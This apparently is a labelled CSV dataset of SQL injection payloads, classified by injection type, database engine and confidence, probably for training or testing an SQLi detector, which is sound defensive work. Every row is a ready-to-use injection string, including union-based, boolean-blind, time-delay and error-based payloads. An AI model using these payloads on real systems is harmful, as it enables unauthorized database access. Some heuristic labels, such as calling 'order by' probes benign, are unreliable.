id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24664,"1 where 9279 = 9279 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24684,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""icow"" like ""icow",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24643,"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
24751,"1 ) as qzif where 7877 = 7877 union all select null,null,null,null,null,null,null--",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2
24776,"1"" ) ) as gbxx where 2459 = 2459 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24780,"1"" ) as zuzm where 1211 = 1211 and elt ( 5458 = 2966,2966 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
24790,"-3219"" ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
24601,"1"" ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
24602,1' ) ) as zbkp where 1720 = 1720 and 4110 = 6748#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
24607,"-5702' ) ) ) union all select 7806,7806,7806,7806,7806--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
24611,"-9896"" ) ) ) union all select 4073,4073,4073,4073,4073#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
24614,-8636' ) ) ) or 4301 = 7212--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
24632,"1"" and 7533 = 7533",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
24633,"1 ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
24637,"1 where 1886 = 1886 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
24641,"1'|| ( select 'tdcr' where 6792 = 6792 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
24642,"1"" ) where 6859 = 6859 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
24648,"1 ) ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
24649,"-9565"" where 1616 = 1616 union all select 1616,1616,1616,1616--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
24650,"1"" ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
24657,-6802 ) as coyv where 5693 = 5693 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
24658,"-3817"" ) as vugz where 3064 = 3064 or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
24665,1%' ) ) and 3721 = 2597#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
24667,"1"" ) ) as yfpl where 4820 = 4820 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
24669,-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
24672,-7633' ) as aslj where 2317 = 2317 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
24673,"1 ) as ezje where 5234 = 5234 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2
24679,"-1401"" ) ) union all select 3480,3480,3480,3480,3480,3480--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
24688,"-9758'+ ( select 'rlcy' where 3691 = 3691 union all select 3691,3691,3691,3691,3691,3691,3691--",union_based,generic,0.7,UNION-based payload detected. Payload length: 95 chars.,2
24689,"-4473' ) union all select 7656,7656#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
24696,-9522 ) as lraw where 9472 = 9472 or ( 4087 = 8213 ) *8213--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
24701,"-1339 ) ) ) union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
24703,-8453 ) ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
24707,"-3116 ) ) as jyiq where 3875 = 3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",union_based,generic,0.7,UNION-based payload detected. Payload length: 93 chars.,2
24709,"1"" ) ) as etap where 8506 = 8506 union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
24720,1 ) union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 26 chars.,2
24728,1' ) and 5999 = 5879,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
24730,-2793' ) where 2621 = 2621 union all select 2621#,union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
24731,1 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 24 chars.,2
24733,"-6680%"" ) ) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
24736,"-5624' union all select 3723,3723,3723,3723,3723--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
24737,"-9371' ) union all select 5900,5900,5900#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
24743,"1 ) as lhie where 4631 = 4631 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
24747,"-6924' ) union all select 2046,2046,2046,2046,2046,2046,2046--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
24755,"1'+ ( select 'ixza' where 4374 = 4374 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
24757,"1 ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
24758,-3677' ) ) or 1939 = 4484,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
24761,"1%' ) ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
24763,"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
24767,-9393' where 3119 = 3119 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
24769,"-8506' ) ) ) union all select 1950,1950,1950,1950,1950,1950--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
24772,"-3505"" ) or 5290 = 3436--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
24774,"1' where 4245 = 4245 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
24779,-5113' ) ) ) or 7200 = 3094--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
24783,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
24786,"-5757%"" ) or 6872 = 6872 and ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
24795,"1' ) ) as ezpq where 2976 = 2976 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
24796,"1'|| ( select 'zqdn' where 6194 = 6194 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
24609,"1' ) where 3255 = 3255 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24610,"1"" ) ) as pafp where 6770 = 6770 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24620,"1%' ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24639,"1"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24653,"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24677,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'qdhz' = 'qdhz",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24697,"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24698,"1"" ) where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24713,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'maln' like 'maln",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24741,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nhuk' = 'nhuk",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24750,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'wcmt' = 'wcmt",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24756,"1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'dzzx' = 'dzzx",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24759,"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nbsr' like 'nbsr",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24773,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'knhm' = 'knhm",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24788,"1' ) ) as kfnt where 8090 = 8090 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24626,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'mhvy' like 'mhvy",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24647,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24655,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'wesl' = 'wesl",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24661,"1%"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24662,"1"" ) and sleep ( 5 ) and ( ""fsuf"" like ""fsuf",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24714,"1%"" ) and elt ( 4249 = 4249,7259 ) and ( ""%"" = """,boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24721,"1%"" ) and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24748,"-2901"" or elt ( 9866 = 9099,9099 ) and ""asib"" like ""asib",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24752,"1%' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24770,1 and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24784,1' ) where 3187 = 3187 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 34 chars.,1
24787,"1"" or sleep ( 5 ) and ""fbuo"" like ""fbuo",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24791,"1"" ) ) ) or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24604,"-2460%"" ) or ( 2660 = 5767 ) *5767 and ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,1
24675,1' ) and ( 2763 = 4004 ) *4004 and ( 'dtts' = 'dtts,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,1
24680,end and ( ( ( 'ycte' = 'ycte,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1
24683,-8010' or ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,1
24723,"-4340 ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 8505 = 8505",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
24749,-6500' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'padu' like 'padu,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,1
24603,1 ) ) as smtf where 5829 = 5829,benign,generic,0.5,. Payload length: 31 chars.,1
24605,1' ) ) as myws where 5274 = 5274,benign,generic,0.5,. Payload length: 32 chars.,1
24619,"1"" where 9669 = 9669",benign,generic,0.5,. Payload length: 20 chars.,1
24628,1 ) ) as gocb where 4335 = 4335,benign,generic,0.5,. Payload length: 31 chars.,1
